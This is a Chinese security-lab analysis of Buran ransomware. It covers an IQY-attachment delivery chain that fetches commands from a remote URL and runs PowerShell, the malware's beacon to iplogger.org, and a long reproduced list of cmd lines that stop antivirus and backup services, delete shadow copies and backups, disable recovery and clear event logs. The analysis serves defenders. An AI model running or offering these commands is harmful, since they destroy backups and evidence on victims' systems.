**近日，深信服安全团队关注到一项新的垃圾邮件活动用来传播Buran勒索病毒，其通过传播IQY（Microsoft Excel Web
Query）附件，诱导用户打开附件，该附件通过请求网上数据执行powershell，用来进行病毒母体的下载。该家族之前使用”Rig Exploit
Kit”工具包(使用CVE-2018-8174-微软IE浏览器远程命令执行漏洞)进行攻击，可以看到勒索病毒在使用多种技术以及方式进行攻击，让受害者防不胜防。**

据悉，Buran勒索病毒实为VegaLocker勒索病毒的变种，两者在加密后都会修改文件后缀为生成的用户ID，勒索信息文件结构也十分相似：

![图片1.png](https://image.3001.net/images/20191121/1574298424_5dd5e338bfc57.png!small)左图为VegaLocker勒索病毒，右图为Buran勒索病毒。  

与VegaLocker勒索病毒有所不同的是，Buran的传播方式更加多变。如利用IQY附件进行传播，当打开IQY文件时，需要通过用户的交互才能成功利用，点击启用后excel会从外部资源导入数据：  

![图片2.png](https://image.3001.net/images/20191121/1574298450_5dd5e352c0f0a.png!small)iqy文件包含的命令内容是读取并执行<http://ocean-v.com/wp-content/1.txt>中包含的命令，调用cmd,cmd调用powershell下载运行勒索病毒：  

![图片3.png](https://image.3001.net/images/20191121/1574298468_5dd5e364ab7d5.png!small)加密后将会修改文件后缀名为生成的用户ID：  

![图片4.png](https://image.3001.net/images/20191121/1574298484_5dd5e3741027f.png!small)

##  **勒索病毒详细分析**

Buran勒索病毒带有使用RunPE的加壳程序，会在内存中释放并运行Delphi母体，母体运行后会首先检测启动参数。

 **不带参数启动**

当程序以不带参数的方式启动时，程序会解密出IP地址查询域名，获取国家名称：

![图片5.png](https://image.3001.net/images/20191121/1574298552_5dd5e3b884a56.png!small)随后解密出UKraine、Belorussia、Kazakhstan、Russian
Federation，并比较地区代码，如有符合则退出程序不进行加密：  

![图片6.png](https://image.3001.net/images/20191121/1574298572_5dd5e3ccd5ce2.png!small)接着测试是否能在Temp目录下释放文件，如果可以则遍历进程，随机选取一个进程名称作为文件名，拷贝自身到%appdata%
\Microsoft\Windows\目录下，否则退出程序：  

![图片7.png](https://image.3001.net/images/20191121/1574298597_5dd5e3e5487f6.png!small)

自复制后以”-start”参数重新启动进程，并进行自删除。

 **带”-start”参数启动**

当程序以带”-start”参数形式启动时，会在注册表中写入Public Key和Encrypted Private Key:

![图片8.png](https://image.3001.net/images/20191121/1574298808_5dd5e4b8f195c.png!small)检查注册表项HKEY_CURRENT_USER\Software\Buran\Knock的值，如果不为0x29A，则连接URL”
iplogger.org /1i8r57.jpg”，发送病毒版本和生成的ID，最后创建Knock键值写入0x29A：  

![图片9.png](https://image.3001.net/images/20191121/1574298822_5dd5e4c654f65.png!small)

随后以” -agent 0”参数重新启动进程。

 **带” -agent 0”参数启动**

当带” -agent 0”参数启动程序时，病毒会调用cmd执行命令用以关闭影响加密的服务，总计有200个命令行，相关命令行如下：

"C:\Windows\system32\cmd.exe" /C net stop "Acronis VSS Provider" /y  
---  
"C:\Windows\system32\cmd.exe" /C net stop "Enterprise Client Service" /y  
"C:\Windows\system32\cmd.exe" /C net stop "SQL Backups" /y  
"C:\Windows\system32\cmd.exe" /C net stop "SQLsafe Backup Service" /y  
"C:\Windows\system32\cmd.exe" /C net stop "SQLsafe Filter Service" /y  
"C:\Windows\system32\cmd.exe" /C net stop "Sophos Agent" /y  
"C:\Windows\system32\cmd.exe" /C net stop "Sophos AutoUpdate Service" /y  
"C:\Windows\system32\cmd.exe" /C net stop "Sophos Clean Service" /y  
"C:\Windows\system32\cmd.exe" /C net stop "Sophos Device Control Service" /y  
"C:\Windows\system32\cmd.exe" /C net stop "Sophos File Scanner Service" /y  
"C:\Windows\system32\cmd.exe" /C net stop "Sophos Health Service" /y  
"C:\Windows\system32\cmd.exe" /C net stop "Sophos MCS Agent" /y  
"C:\Windows\system32\cmd.exe" /C net stop "Sophos MCS Client" /y  
"C:\Windows\system32\cmd.exe" /C net stop "Sophos Message Router" /y  
"C:\Windows\system32\cmd.exe" /C net stop "Sophos Safestore Service" /y  
"C:\Windows\system32\cmd.exe" /C net stop "Sophos System Protection Service"
/y  
"C:\Windows\system32\cmd.exe" /C net stop "Sophos Web Control Service" /y  
"C:\Windows\system32\cmd.exe" /C net stop "Symantec System Recovery" /y  
"C:\Windows\system32\cmd.exe" /C net stop "Veeam Backup Catalog Data Service"
/y  
"C:\Windows\system32\cmd.exe" /C net stop "Zoolz 2 Service" /y  
"C:\Windows\system32\cmd.exe" /C net stop ARSM /y  
"C:\Windows\system32\cmd.exe" /C net stop **P /y  
"C:\Windows\system32\cmd.exe" /C net stop AcrSch2Svc /y  
"C:\Windows\system32\cmd.exe" /C net stop AcronisAgent /y  
"C:\Windows\system32\cmd.exe" /C net stop Antivirus /y  
"C:\Windows\system32\cmd.exe" /C net stop BackupExecAgentAccelerator /y  
"C:\Windows\system32\cmd.exe" /C net stop BackupExecAgentBrowser /y  
"C:\Windows\system32\cmd.exe" /C net stop BackupExecDeviceMediaService /y  
"C:\Windows\system32\cmd.exe" /C net stop BackupExecJobEngine /y  
"C:\Windows\system32\cmd.exe" /C net stop BackupExecManagementService /y  
"C:\Windows\system32\cmd.exe" /C net stop BackupExecRPCService /y  
"C:\Windows\system32\cmd.exe" /C net stop BackupExecVSSProvider /y  
"C:\Windows\system32\cmd.exe" /C net stop DCAgent /y  
"C:\Windows\system32\cmd.exe" /C net stop EPSecurityService /y  
"C:\Windows\system32\cmd.exe" /C net stop EPUpdateService /y  
"C:\Windows\system32\cmd.exe" /C net stop ESHASRV /y  
"C:\Windows\system32\cmd.exe" /C net stop EhttpSrv /y  
"C:\Windows\system32\cmd.exe" /C net stop EraserSvc11710 /y  
"C:\Windows\system32\cmd.exe" /C net stop EsgShKernel /y  
"C:\Windows\system32\cmd.exe" /C net stop FA_Scheduler /y  
"C:\Windows\system32\cmd.exe" /C net stop IISAdmin /y  
"C:\Windows\system32\cmd.exe" /C net stop IMAP4Svc /y  
"C:\Windows\system32\cmd.exe" /C net stop K**FS /y  
"C:\Windows\system32\cmd.exe" /C net stop K**FSGT /y  
"C:\Windows\system32\cmd.exe" /C net stop MBAMService /y  
"C:\Windows\system32\cmd.exe" /C net stop MBEndpointAgent /y  
"C:\Windows\system32\cmd.exe" /C net stop MMS /y  
"C:\Windows\system32\cmd.exe" /C net stop MSExchangeES /y  
"C:\Windows\system32\cmd.exe" /C net stop MSExchangeIS /y  
"C:\Windows\system32\cmd.exe" /C net stop MSExchangeMGMT /y  
"C:\Windows\system32\cmd.exe" /C net stop MSExchangeMTA /y  
"C:\Windows\system32\cmd.exe" /C net stop MSExchangeSA /y  
"C:\Windows\system32\cmd.exe" /C net stop MSExchangeSRS /y  
"C:\Windows\system32\cmd.exe" /C net stop MSOLAP$SQL_2008 /y  
"C:\Windows\system32\cmd.exe" /C net stop MSOLAP$SYSTEM_BGC /y  
"C:\Windows\system32\cmd.exe" /C net stop MSOLAP$TPS /y  
"C:\Windows\system32\cmd.exe" /C net stop MSOLAP$TPSAMA /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$BKUPEXEC /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$ECWDB2 /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$PRACTICEMGT /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$PRACTTICEBGC /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$PROD /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$PROFXENGAGEMENT /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$SBSMONITORING /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$SHAREPOINT /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$SOPHOS /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$SQLEXPRESS /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$SQL_2008 /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$SYSTEM_BGC /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$TPS /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$TPSAMA /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$VEEAMSQL2008R2 /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQL$VEEAMSQL2012 /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQLFDLauncher /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQLFDLauncher$PROFXENGAGEMENT /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQLFDLauncher$SBSMONITORING /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQLFDLauncher$SHAREPOINT /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQLFDLauncher$SQL_2008 /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQLFDLauncher$SYSTEM_BGC /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQLFDLauncher$TPS /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQLFDLauncher$TPSAMA /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQLSERVER /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQLServerADHelper /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQLServerADHelper100 /y  
"C:\Windows\system32\cmd.exe" /C net stop MSSQLServerOLAPService /y  
"C:\Windows\system32\cmd.exe" /C net stop McAfeeEngineService /y  
"C:\Windows\system32\cmd.exe" /C net stop McAfeeFramework /y  
"C:\Windows\system32\cmd.exe" /C net stop McAfeeFrameworkMcAfeeFramework /y  
"C:\Windows\system32\cmd.exe" /C net stop McShield /y  
"C:\Windows\system32\cmd.exe" /C net stop McTaskManager /y  
"C:\Windows\system32\cmd.exe" /C net stop MsDtsServer /y  
"C:\Windows\system32\cmd.exe" /C net stop MsDtsServer100 /y  
"C:\Windows\system32\cmd.exe" /C net stop MsDtsServer110 /y  
"C:\Windows\system32\cmd.exe" /C net stop MySQL57 /y  
"C:\Windows\system32\cmd.exe" /C net stop MySQL80 /y  
"C:\Windows\system32\cmd.exe" /C net stop NetMsmqActivator /y  
"C:\Windows\system32\cmd.exe" /C net stop OracleClientCache80 /y  
"C:\Windows\system32\cmd.exe" /C net stop PDVFSService /y  
"C:\Windows\system32\cmd.exe" /C net stop POP3Svc /y  
"C:\Windows\system32\cmd.exe" /C net stop ReportServer /y  
"C:\Windows\system32\cmd.exe" /C net stop ReportServer$SQL_2008 /y  
"C:\Windows\system32\cmd.exe" /C net stop ReportServer$SYSTEM_BGC /y  
"C:\Windows\system32\cmd.exe" /C net stop ReportServer$TPS /y  
"C:\Windows\system32\cmd.exe" /C net stop ReportServer$TPSAMA /y  
"C:\Windows\system32\cmd.exe" /C net stop S**AdminService /y  
"C:\Windows\system32\cmd.exe" /C net stop S**Service /y  
"C:\Windows\system32\cmd.exe" /C net stop SDRSVC /y  
"C:\Windows\system32\cmd.exe" /C net stop SMTPSvc /y  
"C:\Windows\system32\cmd.exe" /C net stop SNAC /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$BKUPEXEC /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$CITRIX_METAFRAME /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$CXDB /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$ECWDB2 /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$PRACTTICEBGC /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$PRACTTICEMGT /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$PROD /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$PROFXENGAGEMENT /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$SBSMONITORING /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$SHAREPOINT /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$SOPHOS /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$SQLEXPRESS /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$SQL_2008 /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$SYSTEM_BGC /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$TPS /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$TPSAMA /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$VEEAMSQL2008R2 /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLAgent$VEEAMSQL2012 /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLBrowser /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLSERVERAGENT /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLSafeOLRService /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLTELEMETRY /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLTELEMETRY$ECWDB2 /y  
"C:\Windows\system32\cmd.exe" /C net stop SQLWriter /y  
"C:\Windows\system32\cmd.exe" /C net stop SamSs /y  
"C:\Windows\system32\cmd.exe" /C net stop SepMasterService /y  
"C:\Windows\system32\cmd.exe" /C net stop ShMonitor /y  
"C:\Windows\system32\cmd.exe" /C net stop SmcService /y  
"C:\Windows\system32\cmd.exe" /C net stop Smcinst /y  
"C:\Windows\system32\cmd.exe" /C net stop SntpService /y  
"C:\Windows\system32\cmd.exe" /C net stop SstpSvc /y  
"C:\Windows\system32\cmd.exe" /C net stop TmCCSF /y  
"C:\Windows\system32\cmd.exe" /C net stop TrueKey /y  
"C:\Windows\system32\cmd.exe" /C net stop TrueKeyScheduler /y  
"C:\Windows\system32\cmd.exe" /C net stop TrueKeyServiceHelper /y  
"C:\Windows\system32\cmd.exe" /C net stop UI0Detect /y  
"C:\Windows\system32\cmd.exe" /C net stop VeeamBackupSvc /y  
"C:\Windows\system32\cmd.exe" /C net stop VeeamBrokerSvc /y  
"C:\Windows\system32\cmd.exe" /C net stop VeeamCatalogSvc /y  
"C:\Windows\system32\cmd.exe" /C net stop VeeamCloudSvc /y  
"C:\Windows\system32\cmd.exe" /C net stop VeeamDeploySvc /y  
"C:\Windows\system32\cmd.exe" /C net stop VeeamDeploymentService /y  
"C:\Windows\system32\cmd.exe" /C net stop VeeamEnterpriseManagerSvc /y  
"C:\Windows\system32\cmd.exe" /C net stop VeeamHvIntegrationSvc /y  
"C:\Windows\system32\cmd.exe" /C net stop VeeamMountSvc /y  
"C:\Windows\system32\cmd.exe" /C net stop VeeamNFSSvc /y  
"C:\Windows\system32\cmd.exe" /C net stop VeeamRESTSvc /y  
"C:\Windows\system32\cmd.exe" /C net stop VeeamTransportSvc /y  
"C:\Windows\system32\cmd.exe" /C net stop W3Svc /y  
"C:\Windows\system32\cmd.exe" /C net stop WRSVC /y  
"C:\Windows\system32\cmd.exe" /C net stop bedbg /y  
"C:\Windows\system32\cmd.exe" /C net stop ekrn /y  
"C:\Windows\system32\cmd.exe" /C net stop kavfsslp /y  
"C:\Windows\system32\cmd.exe" /C net stop klnagent /y  
"C:\Windows\system32\cmd.exe" /C net stop macmnsvc /y  
"C:\Windows\system32\cmd.exe" /C net stop masvc /y  
"C:\Windows\system32\cmd.exe" /C net stop mfefire /y  
"C:\Windows\system32\cmd.exe" /C net stop mfemms /y  
"C:\Windows\system32\cmd.exe" /C net stop mfevtp /y  
"C:\Windows\system32\cmd.exe" /C net stop mozyprobackup /y  
"C:\Windows\system32\cmd.exe" /C net stop msftesql$PROD /y  
"C:\Windows\system32\cmd.exe" /C net stop ntrtscan /y  
"C:\Windows\system32\cmd.exe" /C net stop sacsvr /y  
"C:\Windows\system32\cmd.exe" /C net stop sophossps /y  
"C:\Windows\system32\cmd.exe" /C net stop svcGenericHost /y  
"C:\Windows\system32\cmd.exe" /C net stop swi_filter /y  
"C:\Windows\system32\cmd.exe" /C net stop swi_service /y  
"C:\Windows\system32\cmd.exe" /C net stop swi_update /y  
"C:\Windows\system32\cmd.exe" /C net stop swi_update_64 /y  
"C:\Windows\system32\cmd.exe" /C net stop tmlisten /y  
"C:\Windows\system32\cmd.exe" /C net stop wbengine /y  
"C:\Windows\system32\cmd.exe" /C bcdedit /set {default} bootstatuspolicy
ignoreallfailures  
"C:\Windows\system32\cmd.exe" /C bcdedit /set {default} recoveryenabled no  
"C:\Windows\system32\cmd.exe" /C wbadmin delete catalog -quiet  
"C:\Windows\system32\cmd.exe" /C wbadmin delete systemstatebackup  
"C:\Windows\system32\cmd.exe" /C wbadmin delete systemstatebackup
-keepversions:0  
"C:\Windows\system32\cmd.exe" /C wbadmin delete backup  
"C:\Windows\system32\cmd.exe" /C wmic shadowcopy delete  
"C:\Windows\system32\cmd.exe" /C vssadmin delete shadows /all /quiet  
"C:\Windows\system32\cmd.exe" /C reg delete
"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f  
"C:\Windows\system32\cmd.exe" /C reg delete
"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f  
"C:\Windows\system32\cmd.exe" /C reg add
"HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"  
"C:\Windows\system32\cmd.exe" /C attrib "%userprofile%\documents\Default.rdp"
-s -h  
"C:\Windows\system32\cmd.exe" /C del "%userprofile%\documents\Default.rdp"  
"C:\Windows\system32\cmd.exe" /C wevtutil.exe clear-log Application  
"C:\Windows\system32\cmd.exe" /C wevtutil.exe clear-log Security  
"C:\Windows\system32\cmd.exe" /C wevtutil.exe clear-log System  
"C:\Windows\system32\cmd.exe" /C sc config eventlog start=disabled  
"C:\Windows\system32\cmd.exe" /C net stop RESvc /y  
  
最后使用RSA+AES算法对文件进行加密，加密时会跳过指定目录和文件，以不影响系统运行：

跳过加密的目录  
---  
:\$Windows.~bt\  
:\System Volume Information\  
:\Windows.old\  
:\Windows\  
:\intel\  
:\nvidia\  
:\inetpub\logs\  
\All Users\  
\AppData\  
\Apple Computer\Safari\  
\Application Data\  
\Boot\  
\Google\  
\Google\Chrome\  
\Mozilla Firefox\  
\Mozilla\  
\Opera Software\  
\Opera\  
\Tor Browser\  
\Common Files\  
\Internet Explorer\  
\Windows Defender\  
\Windows Mail\  
\Windows Media Player\  
\Windows Multimedia Platform\  
\Windows NT\  
\Windows Photo Viewer\  
\Windows Portable Devices\  
\WindowsPowerShell\  
\Windows Photo Viewer\  
\Windows Security\  
\Embedded Lockdown Manager\  
\Windows Journal\  
\MSBuild\  
\Reference Assemblies\  
\Windows Sidebar\  
\Windows Defender Advanced Threat Protection\  
\Microsoft\  
\Package Cache\  
\Microsoft Help\  
  
 ***本文作者：深信服千里目安全实验室，转载请注明来自FreeBuf.COM**

